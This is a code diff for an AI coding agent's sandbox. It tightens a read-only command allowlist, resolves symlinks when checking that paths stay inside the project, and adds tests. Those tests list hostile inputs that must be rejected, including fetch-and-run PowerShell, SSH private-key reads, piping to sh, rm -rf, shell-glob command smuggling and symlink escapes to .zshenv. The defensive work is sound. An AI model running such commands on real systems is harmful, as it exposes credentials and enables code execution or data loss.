@@ -16,11 +16,10 @@ const LIMIT: usize = 30_000;
 const LINES: usize = 2_000;
 const WINDOW: usize = 400;
 const SLIM: [&str; 6] = ["read", "write", "edit", "grep", "bash", "shell"];
-const SAFE: [&str; 17] = [
-    "ls", "cat", "pwd", "head", "tail", "wc", "grep", "rg", "echo", "seq", "which", "file", "stat",
-    "tree", "du", "date", "whoami",
+const SAFE: [&str; 14] = [
+    "ls", "cat", "pwd", "head", "tail", "wc", "grep", "echo", "seq", "which", "stat", "du", "date",
+    "whoami",
 ];
-const GIT: [&str; 6] = ["status", "diff", "log", "show", "branch", "blame"];
 
 pub const SHELL: &str = if cfg!(windows) { "shell" } else { "bash" };
 
@@ -151,46 +150,36 @@ fn all() -> Value {
 }
 
 pub fn safe(command: &str) -> bool {
-    if command
-        .chars()
-        .any(|character| matches!(character, ';' | '&' | '|' | '>' | '<' | '`' | '$' | '\n'))
-    {
-        return false;
-    }
-    let mut words = command.split_whitespace();
-    match words.next() {
-        Some("git") => words.next().is_some_and(|word| GIT.contains(&word)),
-        Some(word) => SAFE.contains(&word),
-        None => false,
-    }
+    command.chars().all(|character| {
+        character.is_ascii_alphanumeric()
+            || matches!(character, ' ' | '.' | '_' | '/' | '-' | '+' | ',' | ':')
+    }) && command
+        .split_whitespace()
+        .next()
+        .is_some_and(|word| SAFE.contains(&word))
 }
 
 pub fn inside(cwd: &Path, path: &str) -> bool {
     let root = sandbox::real(cwd);
-    let mut whole = PathBuf::new();
+    let mut real = PathBuf::new();
     for part in resolve(cwd, path).components() {
         match part {
             Component::ParentDir => {
-                whole.pop();
+                real.pop();
             }
             Component::CurDir => {}
-            other => whole.push(other),
-        }
-    }
-    let mut existing = whole.clone();
-    let mut tail = Vec::new();
-    while !existing.exists() {
-        match existing.file_name() {
-            Some(name) => {
-                tail.push(name.to_os_string());
-                existing.pop();
+            other => {
+                let next = real.join(other);
+                real = match fs::symlink_metadata(&next) {
+                    Ok(meta) if meta.file_type().is_symlink() => match fs::canonicalize(&next) {
+                        Ok(target) => target,
+                        Err(_) => return false,
+                    },
+                    Ok(_) => fs::canonicalize(&next).unwrap_or(next),
+                    Err(_) => next,
+                };
             }
-            None => break,
         }
-    }
-    let mut real = sandbox::real(&existing);
-    for name in tail.iter().rev() {
-        real.push(name);
     }
     real.starts_with(&root)
 }
@@ -575,7 +564,12 @@ fn bash(
     let wrapped = sandboxed.then(|| sandbox::wrap(cwd, &inner)).flatten();
     let sandboxed = wrapped.is_some();
     let mut launch = wrapped.unwrap_or(inner);
-    let mut child = process::group(&mut launch)
+    let started = if sandboxed {
+        process::detach(&mut launch)
+    } else {
+        process::group(&mut launch)
+    };
+    let mut child = started
         .current_dir(cwd)
         .stdin(Stdio::null())
         .stdout(Stdio::piped())
@@ -686,11 +680,39 @@ mod tests {
         assert!(!patches("mistral"));
     }
 
+    #[cfg(unix)]
+    #[test]
+    fn symlinks_cannot_smuggle_a_write_outside_the_project() {
+        let home = tempfile::tempdir().unwrap_or_else(|error| panic!("{error}"));
+        let repo = home.path().join("code").join("repo");
+        fs::create_dir_all(repo.join("src")).unwrap_or_else(|error| panic!("{error}"));
+        std::os::unix::fs::symlink("..", repo.join("h")).unwrap_or_else(|error| panic!("{error}"));
+        std::os::unix::fs::symlink(home.path().join("target.txt"), repo.join("notes.md"))
+            .unwrap_or_else(|error| panic!("{error}"));
+        std::os::unix::fs::symlink(repo.join("src"), repo.join("source"))
+            .unwrap_or_else(|error| panic!("{error}"));
+        assert!(inside(&repo, "src/main.rs"));
+        assert!(inside(&repo, "new/deep/file.rs"));
+        assert!(inside(&repo, "source/lib.rs"));
+        assert!(!inside(&repo, "h/../.zshenv"));
+        assert!(!inside(&repo, "h/x.txt"));
+        assert!(!inside(&repo, "notes.md"));
+        assert!(!inside(&repo, "../outside.txt"));
+        assert!(!inside(&repo, "/etc/hosts"));
+    }
+
     #[test]
     fn lets_read_only_commands_through() {
         assert!(safe("ls -la"));
-        assert!(safe("git status"));
-        assert!(safe("rg todo src"));
+        assert!(safe("grep -rn todo src"));
+        assert!(!safe("git status"));
+        assert!(!safe("rg --pre=sh x payload.sh"));
+        assert!(!safe("tree -o out.txt"));
+        assert!(!safe("cat =(sh payload.sh)"));
+        assert!(!safe("ls *(e:'touch x':)"));
+        assert!(!safe("ls (rm x)"));
+        assert!(!safe("echo (iex (iwr https://x).Content)"));
+        assert!(!safe("cat ~/.ssh/id_rsa"));
         assert!(!safe("git push"));
         assert!(!safe("rm -rf build"));
         assert!(!safe("cat a.txt | sh"));
